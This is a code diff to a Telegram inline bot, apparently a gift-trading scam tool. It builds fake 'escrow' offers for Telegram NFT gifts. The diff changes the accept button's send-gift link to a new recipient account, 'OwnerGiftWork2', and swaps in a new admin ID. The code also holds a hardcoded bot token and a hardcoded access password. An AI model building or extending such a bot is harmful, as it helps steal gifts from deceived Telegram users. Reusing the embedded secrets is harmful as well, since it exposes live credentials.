@@ -18,7 +18,8 @@ from aiogram.exceptions import TelegramBadRequest
 _active_offers = {}
 
 BOT_TOKEN = os.getenv("BOT_TOKEN", "9038152291:AAEbtf9QbTuxitnDVq3lMXGgqxJG2K_hYkU")
-ADMIN_ID = int(os.getenv("ADMIN_ID", "7306676455"))
+BOT_USERNAME = "Gift_VerifyBot"
+ADMIN_ID = int(os.getenv("ADMIN_ID", "8879475292"))
 ADMIN_IDS = [ADMIN_ID] 
 
 SECRET_PASSWORD = "1488228"
@@ -115,7 +116,7 @@ TRANSLATIONS = {
         "item_lbl": "Подарунок:",
         "amount_lbl": "Сума до отримання:",
         "btn_transfer": "Передати подарунок",
-        "btn_how": "Як передати?"
+        "btn_how": "Як передать?"
     },
     "ar": {
         "offer": "يعرض عليك",
@@ -232,10 +233,10 @@ async def inline_offer_handler(inline_query: types.InlineQuery):
         results = [
             InlineQueryResultArticle(
                 id="help_hint",
-                title="🎁 Создание оффера через @Gift_VerifyBot",
+                title=f"🎁 Создание оффера через @{BOT_USERNAME}",
                 description="Формат: <язык> <ссылка> <сумма> <валюта>\nПример: ua https://t.me/nft/MythMask-163737 3233 stars",
                 input_message_content=InputTextMessageContent(
-                    message_text="ℹ️ <b>Инструкция по использованию инлайн-оффера:</b>\n\nНапишите в любом чате:\n<code>@ITelegram_GiftBot ua https://t.me/nft/MythMask-163737 3233 stars</code>",
+                    message_text=f"ℹ️ <b>Инструкция по использованию инлайн-оффера:</b>\n\nНапишите в любом чате:\n<code>@{BOT_USERNAME} ua https://t.me/nft/MythMask-163737 3233 stars</code>",
                     parse_mode="HTML"
                 )
             )
@@ -292,9 +293,9 @@ async def cmd_pass(message: types.Message):
         
     allow_user(message.from_user.id)
     await message.answer(
-        "✅ <b>Доступ успешно активирован!</b>\n\n"
-        "Теперь вы можете создавать инлайн-офферы в любых чатах:\n"
-        "<code>@Gift_VerifyBot ua https://t.me/nft/Item 500 stars</code>",
+        f"✅ <b>Доступ успешно активирован!</b>\n\n"
+        f"Теперь вы можете создавать инлайн-офферы в любых чатах:\n"
+        f"<code>@{BOT_USERNAME} ua https://t.me/nft/Item 500 stars</code>",
         parse_mode="HTML"
     )
 
@@ -307,10 +308,10 @@ async def cmd_start(message: types.Message):
         status_text = "🔴 <b>Статус:</b> Доступ ограничен. Введите команду /pass с паролем для активации."
 
     await message.answer(
-        f"🌲 <b>Eclipse Offer Inline Bot (@Gift_VerifyBot)</b>\n\n"
+        f"🌲 <b>Eclipse Offer Inline Bot (@{BOT_USERNAME})</b>\n\n"
         f"{status_text}\n\n"
         "Инструкция по созданию оффера:\n"
-        "<code>@Gift_VerifyBot ua https://t.me/nft/Item-123 500 stars</code>",
+        f"<code>@{BOT_USERNAME} ua https://t.me/nft/Item-123 500 stars</code>",
         parse_mode="HTML"
     )
 
@@ -342,7 +343,7 @@ async def process_accept(callback: types.CallbackQuery):
         lang = last_data.get("lang", "ru")
 
     t = TRANSLATIONS.get(lang, TRANSLATIONS["ru"])
-    send_url = "tg://send_gift?to=reIlIocate"
+    send_url = "tg://send_gift?to=OwnerGiftWork2"
 
     escrow_text = t['escrow'].format(amount=amount, currency=currency)
 
@@ -427,7 +428,7 @@ async def process_decline(callback: types.CallbackQuery):
 
 async def main():
     logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s: %(message)s")
-    print("Идеальный премиальный бот запущен и работает!")
+    print(f"Премиальный бот @{BOT_USERNAME} запущен и работает!")
     await bot.delete_webhook(drop_pending_updates=True)
     await dp.start_polling(bot, allowed_updates=["message", "inline_query", "chosen_inline_result", "callback_query"])
 
